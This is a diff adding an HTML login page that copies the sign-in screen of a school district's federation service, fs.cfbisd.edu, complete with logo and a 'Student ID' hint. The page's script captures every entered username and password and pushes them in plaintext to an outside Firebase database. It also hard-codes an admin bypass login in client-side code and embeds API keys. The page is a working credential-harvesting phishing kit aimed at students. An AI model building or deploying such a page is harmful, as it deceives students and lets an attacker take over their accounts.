@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <link rel="stylesheet" type="text/css" href="./StyleSheet.css"/>
+</head>
+
+<body>
+  <div class="MainArea">
+        <div class="Header"><span>Sign In</span></div>
+        
+        <div class="GroupXLargeMargin"><img src="./cfbisd edu_logo_v1.png" alt="logo" /></div>
+        
+        <div class="GroupLargeMargin">
+            <div class="TextSizeXLarge"><span>fs.cfbisd.edu</span></div>
+        </div>
+
+    <div class="MainActionContainer">
+      <form id="form">
+  <div class="GroupXLargeMargin"><span>Type your user name and password.</span></div>
+  <table class="UsernamePasswordTable">
+        <tr>
+            <td><span class="Label"><span>User name: </span></span></td>
+            <td><input type="text"/></td>
+            <td class="TextColorSecondary TextSizeSmall"><span>Example: Student ID</span></td>
+        </tr>
+
+        <tr>
+            <td><span class="Label"><span>Password: </span></span></td>
+            <td><input type="password"/></td>
+            <td>&nbsp;</td>
+        </tr>
+
+        <tr>
+            <td></td>
+            <td colspan="2" class="TextSizeSmall TextColorError"></td>
+        </tr>
+
+        <tr>
+      <td colspan="2">
+        <div class="RightAlign GroupXLargeMargin">
+          <input type="submit" value="Sign In" class="Resizable" />
+        </div>
+      </td>
+            <td>&nbsp;</td>
+        </tr>
+
+  </table>
+
+  </form>
+  </div>
+
+
+
+
+    
+   <!-- Firebase SDKs (v8, global build) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+  <script>
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBGPFSP0e0oYqKqvJHLB5eGlX9mJ8aU09s",
+      authDomain: "test-da143.firebaseapp.com",
+      databaseURL: "https://test-da143-default-rtdb.firebaseio.com",
+      projectId: "test-da143",
+      storageBucket: "test-da143.firebasestorage.app",
+      messagingSenderId: "58366480447",
+      appId: "1:58366480447:web:f3dd12850f09952b49688a",
+      measurementId: "G-T5HK7JTWHW"
+    };
+
+    // Initialize Firebase (v8 syntax)
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Handle form submit
+    const form = document.getElementById("form");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const username = document.querySelector('input[type="text"]').value.trim();
+      const password = document.querySelector('input[type="password"]').value.trim();
+
+      // Admin redirect
+      if (username === "999999" && password === "Qwerty") {
+        sessionStorage.setItem("adminAccess", "true");
+        // store username as well for consistency
+        sessionStorage.setItem('username', username);
+        window.location.href = "./admin.html";
+        return;
+      }
+
+      // Validation
+      if (!/^\d{6}$/.test(username)) {
+        alert("Username must be exactly 6 digits.");
+        return;
+      }
+      if (!password) {
+        alert("Password cannot be empty.");
+        return;
+      }
+  // store username immediately so homepage can use it
+  try { sessionStorage.setItem('username', username); } catch(e) { console.warn('sessionStorage set failed', e); }
+  try { localStorage.setItem('username', username); } catch(e) { console.warn('localStorage set failed', e); }
+
+      // Write to Firebase
+      db.ref("users").push({
+        username,
+        password,
+        timestamp: Date.now()
+      })
+      .then(() => {
+        form.reset();
+        // Redirect to homepage after successful submit
+        window.location.href = './homepage.html';
+      })
+      .catch(err => alert(err.message));
+    });
+  </script>
+</body>
+</html>
